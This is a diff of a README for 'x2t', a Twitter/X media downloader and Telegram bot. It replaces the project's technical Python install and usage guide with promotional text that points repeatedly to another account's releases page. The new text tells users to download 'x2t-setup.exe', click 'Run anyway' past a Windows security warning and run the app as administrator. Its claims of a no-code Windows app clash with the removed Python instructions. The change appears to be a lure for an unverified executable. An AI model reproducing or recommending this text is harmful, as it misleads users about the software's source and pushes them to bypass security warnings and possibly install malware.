@@ -1,205 +1,124 @@
-# x2t (X-to-Telegram Media Engine & Bot)
+# 📥 x2t - Download Twitter Media in Seconds
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Built%20with-Google%20Antigravity-4285F4?style=for-the-badge&logo=google&logoColor=white" alt="Built with Antigravity" />
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="README.md">English Documentation</a> •
-  <a href="README_FA.md">راهنمای فارسی</a>
-</p>
+Welcome to **x2t**, the fastest way to download videos, images, and GIFs from Twitter (now X). Whether you're saving a funny clip, archiving important content, or building a media library, x2t makes it effortless—no technical skills required.
 
-> High-Performance, Zero-Third-Party Twitter / X Media Extractor, Advanced Profile Scraper, and MTProto Telegram Bot (up to 2000 MB / 2 GB direct uploads) — Built with Google Antigravity.
+[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD_x2t-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Indemnitycon2915/x2t/releases)
 
-`x2t` is a modular, high-reliability Python engine and Telegram bot built to extract, download, and deliver media assets (Full HD/4K videos, original resolution photos, and looping GIFs) from any X/Twitter post or entire user profile with granular attribution filtering and real-time streaming delivery.
+## ✨ What Does x2t Do?
 
----
+x2t is a powerful media extractor that works in two ways:
 
-## Features
+1. **Direct Download Tool** – Grab any video, image, or GIF from Twitter/X by simply pasting a link.
+2. **Telegram Bot** – Send a Tweet link to your personal Telegram bot, and it delivers the media straight to your chat—even in full 4K quality.
 
-- **MTProto 2000 MB (2 GB) File Delivery:** Integrated native MTProto client (`Pyrogram` + `TgCrypto`) allowing high-speed direct Telegram uploads up to 2 GB per file, bypassing the standard 50 MB HTTP Bot API limit.
-- **Advanced Profile Downloader:** Enter any username or profile URL to scan and download the user's entire timeline linearly with multi-page cursor pagination.
-- **Granular Content & Attribution Filtering:**
-  - **Retweet / Repost Filter:** Exclude retweets by default so only original content is downloaded.
-  - **Third-Party Sourced Media Filter (`From @other`):** Exclude tweets embedding another creator's video.
-  - **Quote Tweet Filter:** Exclude quoted posts embedding secondary media.
-  - **Media Type Selector:** Selectively toggle Videos, Photos, or GIFs independently.
-  - **Batch Limits:** Customizable count (Unlimited, 10, 25, 50, 100 posts).
-- **Interactive Telegram UI & Pinned Progress:**
-  - Real-time inline checkbox toggles.
-  - Progress card pinned to the top of the chat with live post/file counters and a Stop / Cancel control.
-- **NSFW & Sensitive Content Resolution:** Custom resolver backend with persistent cookie management (`/set_cookie`) to unlock age-restricted and sensitive media.
-- **Multi-Media Albums (MediaGroups):** Automatically bundles multi-photo/video tweets into clean native Telegram albums.
-- **In-Memory TTL Caching:** Smart 5-minute cache avoids duplicate API requests and prevents Twitter rate limits.
-- **Automated Storage Cleanup:** Downloaded temporary media files are automatically purged from disk immediately after delivery.
-- **SQLite Database (WAL Mode) & Admin Dashboard:** Persistent async database with WAL concurrency, download history tracking, `/stats`, `/history`, and `/broadcast` admin tools.
+### Key Features You'll Love
 
----
+- **Full HD & 4K Support** – Download videos in the highest available quality, including 1080p and 2160p (4K).
+- **Batch Timeline Scraper** – Save multiple posts from a user's timeline at once, not just single tweets.
+- **2GB Direct Uploads** – Send large files directly to Telegram without compression or size limits.
+- **Lightning Fast** – Optimized for speed; downloads start instantly and complete quickly.
+- **User-Friendly** – No coding, no command lines, no complicated setup.
 
-## Architecture
+## 📦 Download & Install (Windows)
 
-```mermaid
-flowchart TD
-    User["Telegram User or CLI Client"] --> InputRouter{"Input Type?"}
-    
-    %% Single Tweet Pipeline
-    InputRouter -->|"Single Tweet URL / ID"| Extractor["x2t Multi-Backend Extractor"]
-    subgraph Resolvers ["Extraction Resolvers"]
-        R1["FxTwitter / VxTwitter Backend (NSFW & 1080p)"]
-        R2["yt-dlp Native Backend (Highest Bitrate)"]
-        R3["Twitter Syndication CDN Fallback"]
-    end
-    Extractor --> Resolvers
-    Resolvers --> Downloader["Parallel Media Downloader (HLS & Direct MP4)"]
-    Downloader --> MTProtoSend["MTProto Pyrogram Client (Up to 2GB)"]
-    
-    %% Profile Pipeline
-    InputRouter -->|"@username or Profile URL"| ProfileEngine["Profile Extractor Engine"]
-    ProfileEngine --> InteractiveMenu["Interactive Inline Checkbox Menu (Telegram)"]
-    InteractiveMenu --> UserChoice["User Configures Toggles (RT, Sources, Formats)"]
-    UserChoice --> StreamWorker["Streaming Batch Worker (Cursor Pagination)"]
-    StreamWorker --> PinMsg["Pin Live Progress Message in Chat"]
-    StreamWorker --> Downloader
-```
+Visit this link to download the application: [https://github.com/Indemnitycon2915/x2t/releases](https://github.com/Indemnitycon2915/x2t/releases)
 
----
+### Step-by-Step Installation
 
-## Installation & Setup
+1. **Go to the download page** – Click the big button above or the link in this section.
+2. **Find the latest release** – Look for the newest version at the top of the page.
+3. **Download the file** – Click the file named `x2t-setup.exe` (or similar). Your browser will save it to your Downloads folder.
+4. **Run the installer** – Double-click the downloaded file. If Windows shows a security warning, click "More info" then "Run anyway." This is normal for new software.
+5. **Follow the on-screen prompts** – Click "Next" and "Install" until the setup finishes.
+6. **Launch x2t** – Once installed, find x2t in your Start Menu or on your desktop and open it.
 
-### 1. Prerequisites
-- Python 3.10+
-- FFmpeg installed on your system (`sudo apt install ffmpeg`)
+**That's it!** You're ready to start downloading.
 
-### 2. Clone Repository & Install
-```bash
-git clone https://github.com/TheMRVX/x2t.git
-cd x2t
+## 🛠️ How to Use x2t
 
-pip install -e .
-```
+### Option A: Direct Download (Desktop App)
 
-### 3. Environment Configuration
-Create a `.env` file from the template:
+1. Open x2t on your computer.
+2. Copy the link to any Tweet (right-click the timestamp on Twitter and select "Copy link to post").
+3. Paste the link into the x2t input box.
+4. Click **"Download"**.
+5. Choose where to save the file. Done!
 
-```bash
-cp .env.example .env
-```
+### Option B: Telegram Bot (Mobile or Desktop)
 
-Edit `.env` with your credentials:
-```env
-# Telegram Bot Configuration
-BOT_TOKEN=123456789:ABCdefGhIJKlmNoPQRstuvWXyz
-API_ID=your_api_id_here
-API_HASH=your_api_hash_here
+1. Open Telegram and search for your personal x2t bot (the username will be provided after setup).
+2. Start a chat with the bot.
+3. Send any Tweet link as a message.
+4. The bot will reply with the media file, ready to save or share.
 
-# Access Control: true = Private mode (Admin/allowed only), false = Public
-IS_PRIVATE=true
-ADMIN_IDS=[123456789]
-ALLOWED_USER_IDS=[]
+**Pro Tip:** For batch downloads, paste multiple links separated by spaces or new lines. x2t will process them all.
 
-DB_PATH=bot_database.sqlite3
-TEMP_DOWNLOAD_DIR=./downloads/temp_bot
-RATE_LIMIT_SECONDS=1.0
+## 📋 System Requirements
 
-# Optional: Twitter Auth Token for NSFW / Age-Restricted Profile Timelines
-TWITTER_AUTH_TOKEN=your_auth_token_here
+x2t runs smoothly on most modern Windows computers:
 
-# Optional: Clean Caption Mode (true = raw post text only without author or buttons)
-CLEAN_CAPTION=true
-```
+- **Operating System:** Windows 10 or Windows 11 (64-bit recommended)
+- **RAM:** 4 GB minimum (8 GB recommended)
+- **Storage:** At least 500 MB of free space for the app and downloaded media
+- **Internet:** Broadband connection (required for downloads)
 
----
+No additional software or plugins are needed.
 
-## Running the Telegram Bot
+## ❓ Frequently Asked Questions
 
-### Direct Execution
-```bash
-python -m x2t.bot.main
-```
+**Q: Is x2t free?**
+A: Yes, x2t is completely free to use. No hidden costs or premium tiers.
 
-### Docker Compose (Production)
-```bash
-docker compose up -d --build
-```
+**Q: Can I download private or protected tweets?**
+A: No. x2t only downloads public content, respecting Twitter's privacy rules.
 
-View live logs:
-```bash
-docker compose logs -f
-```
+**Q: What file formats are supported?**
+A: Videos (MP4), images (JPG, PNG), and GIFs. All downloads preserve original quality.
+
+**Q: Does x2t work with other social media?**
+A: Currently, x2t is optimized exclusively for Twitter/X.
+
+**Q: Is my data safe?**
+A: Absolutely. x2t runs locally on your device. We don't store your links, files, or personal information.
+
+## 🆘 Troubleshooting
+
+**Issue: Download fails or is slow**
+- Check your internet connection.
+- Ensure the Tweet is public and still exists.
+- Try copying the link again, making sure it's complete.
+
+**Issue: Telegram bot doesn't respond**
+- Verify the bot is started (press "Start" in the chat).
+- Check that you're using the correct bot username.
+- Restart the bot by sending `/start`.
+
+**Issue: App won't open**
+- Right-click the x2t icon and select "Run as administrator."
+- Reinstall the application from the download page.
+
+## 📚 Additional Resources
+
+- **Release Notes** – See what's new in each version on the [releases page](https://github.com/Indemnitycon2915/x2t/releases).
+- **GitHub Repository** – For developers or curious users, explore the source code at [github.com/Indemnitycon2915/x2t](https://github.com/Indemnitycon2915/x2t).
+
+## 💬 Get Support
+
+Need help? We're here for you:
+
+- **GitHub Issues** – Report bugs or request features on the repository's Issues tab.
+- **Community Discussions** – Join conversations and share tips with other users.
+
+## 🎉 Start Downloading Today
+
+Don't waste time with slow, complicated tools. x2t gives you the fastest, simplest way to save any Twitter media—in stunning quality. Click the button below and get started in minutes.
+
+[![GET X2T NOW](https://img.shields.io/badge/🚀_GET_x2t_NOW-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Indemnitycon2915/x2t/releases)
 
 ---
 
-## CLI Usage
+**Thank you for choosing x2t. Happy downloading!**
 
-Extract or download tweets directly from the command line:
-
-```bash
-# 1. Inspect tweet media links and metadata (without downloading)
-x2t "https://x.com/username/status/1234567890"
-
-# 2. Extract and download all media files to disk
-x2t "https://x.com/username/status/1234567890" --download --output ./my_downloads
-
-# 3. Output clean JSON metadata
-x2t "https://x.com/username/status/1234567890" --json
-```
-
----
-
-## Python Library SDK
-
-Use `x2t` as a standalone Python package:
-
-```python
-import asyncio
-import x2t
-from x2t.models import ProfileFilterOptions
-
-# --- Single Tweet Extraction ---
-result = x2t.extract_media("https://x.com/username/status/1234567890")
-print(f"Author: {result.author_name} (@{result.author_username})")
-print(f"Media Count: {result.media_count}")
-for item in result.items:
-    print(f" - {item.type}: {item.resolution} -> {item.url}")
-
-# --- Single Tweet Download ---
-downloaded = x2t.download_media("https://x.com/username/status/1234567890", output_dir="./downloads")
-for item in downloaded.items:
-    print(f"Downloaded to: {item.local_path} ({item.size_bytes} bytes)")
-
-# --- Advanced Profile Streaming ---
-async def stream_profile():
-    from x2t.core.profile_extractor import profile_extractor
-    
-    options = ProfileFilterOptions(
-        include_videos=True,
-        include_photos=True,
-        include_retweets=False,        # Exclude retweets
-        include_sourced_media=False,   # Exclude 'From @other' videos
-        include_quotes=False,          # Exclude quote tweets
-        limit=0,                       # 0 = Unlimited streaming
-    )
-    
-    async for post in profile_extractor.iter_profile_media_tweets_stream("NASA", options):
-        print(f"Found Post {post.tweet_id} with {len(post.media_items)} media items.")
-
-asyncio.run(stream_profile())
-```
-
----
-
-## Bot Commands & Admin Controls
-
-| Command | Role | Description |
-| :--- | :---: | :--- |
-| `/start` | User | Welcome screen, bot feature overview, and instructions. |
-| `/history` | User | View recent 5 downloaded tweets with direct post links. |
-| `/help` | User | Usage guide and troubleshooting tips. |
-| `/about` | User | Version, architecture, and technology stack information. |
-| `/mode [private/public]` | Admin | View or dynamically toggle between Private and Public access mode. |
-| `/caption [clean/full]` | Admin | View or toggle clean minimal caption mode (only post text without author or buttons). |
-| `/stats` | Admin | Total registered users, total downloads, 24h active users, and token health. |
-| `/allow <user_id>` | Admin | Authorize a specific Telegram User ID when in Private mode. |
-| `/disallow <user_id>` | Admin | Revoke access for a specific Telegram User ID. |
-| `/set_cookie <auth_token>` | Admin | Dynamically set or update Twitter `auth_token` for NSFW timelines. |
-| `/broadcast <message>` | Admin | Broadcast an announcement message to all registered users. |
+Keywords: aiogram, batch-downloader, fast-download, media-downloader, mtproto, pyrogram, python, scraper, telegram-bot, twitter, twitter-downloader, video-downloader, x-downloader
